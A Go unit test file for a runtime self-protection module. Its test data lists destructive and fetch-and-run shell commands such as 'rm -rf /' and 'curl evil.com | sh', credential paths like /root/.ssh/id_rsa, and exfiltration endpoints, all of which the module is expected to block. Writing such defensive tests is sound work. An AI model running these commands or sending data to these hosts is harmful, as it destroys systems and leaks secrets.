package rasp_test

import (
	"testing"

	"github.com/immortal-engine/immortal/internal/security/rasp"
)

func TestRASPBlocksDangerousCommands(t *testing.T) {
	m := rasp.NewDefault()

	dangerous := []string{
		"rm -rf /",
		"chmod 777 /etc",
		"curl evil.com | sh",
		"dd if=/dev/zero of=/dev/sda",
		"shutdown -h now",
	}

	for _, cmd := range dangerous {
		v := m.CheckCommand(cmd)
		if v.Type != rasp.ViolationDangerousExec {
			t.Errorf("should block dangerous command: %s", cmd)
		}
		if !v.Blocked {
			t.Errorf("should be blocked: %s", cmd)
		}
	}
}

func TestRASPAllowsSafeCommands(t *testing.T) {
	m := rasp.NewDefault()

	safe := []string{
		"ls -la",
		"cat README.md",
		"go build ./...",
		"npm install",
		"git status",
	}

	for _, cmd := range safe {
		v := m.CheckCommand(cmd)
		if v.Type != rasp.ViolationNone {
			t.Errorf("safe command should be allowed: %s (got %s)", cmd, v.Type)
		}
	}
}

func TestRASPBlocksSensitiveFiles(t *testing.T) {
	m := rasp.NewDefault()

	sensitive := []string{
		"/etc/passwd",
		"/etc/shadow",
		"/home/user/.env",
		"config/credentials.json",
		"/root/.ssh/id_rsa",
	}

	for _, path := range sensitive {
		v := m.CheckFileAccess(path)
		if v.Type != rasp.ViolationFileAccess {
			t.Errorf("should block sensitive file: %s", path)
		}
	}
}

func TestRASPAllowsSafeFiles(t *testing.T) {
	m := rasp.NewDefault()

	safe := []string{
		"/var/log/app.log",
		"/home/user/project/main.go",
		"/tmp/data.json",
		"README.md",
	}

	for _, path := range safe {
		v := m.CheckFileAccess(path)
		if v.Type != rasp.ViolationNone {
			t.Errorf("safe file should be allowed: %s", path)
		}
	}
}

func TestRASPBlocksExfiltration(t *testing.T) {
	m := rasp.NewDefault()

	exfil := []string{
		"https://pastebin.com/raw/abc123",
		"https://webhook.site/token",
		"https://evil.ngrok.io/data",
		"https://burpcollaborator.net/test",
	}

	for _, url := range exfil {
		v := m.CheckOutbound(url)
		if v.Type != rasp.ViolationNetworkExfil {
			t.Errorf("should block exfiltration: %s", url)
		}
	}
}

func TestRASPAllowsSafeOutbound(t *testing.T) {
	m := rasp.NewDefault()

	safe := []string{
		"https://api.example.com/data",
		"https://github.com/repo",
		"https://cdn.cloudflare.com/lib.js",
	}

	for _, url := range safe {
		v := m.CheckOutbound(url)
		if v.Type != rasp.ViolationNone {
			t.Errorf("safe URL should be allowed: %s", url)
		}
	}
}

func TestRASPViolationHistory(t *testing.T) {
	m := rasp.NewDefault()

	m.CheckCommand("rm -rf /")
	m.CheckFileAccess("/etc/passwd")
	m.CheckOutbound("https://pastebin.com/data")

	violations := m.Violations()
	if len(violations) != 3 {
		t.Errorf("expected 3 violations, got %d", len(violations))
	}
}

func TestRASPStats(t *testing.T) {
	m := rasp.NewDefault()

	m.CheckCommand("ls -la")         // safe
	m.CheckCommand("rm -rf /")       // blocked
	m.CheckFileAccess("README.md")   // safe
	m.CheckFileAccess("/etc/passwd") // blocked

	total, blocked := m.Stats()
	if total != 4 {
		t.Errorf("expected 4 total checks, got %d", total)
	}
	if blocked != 2 {
		t.Errorf("expected 2 blocked, got %d", blocked)
	}
}
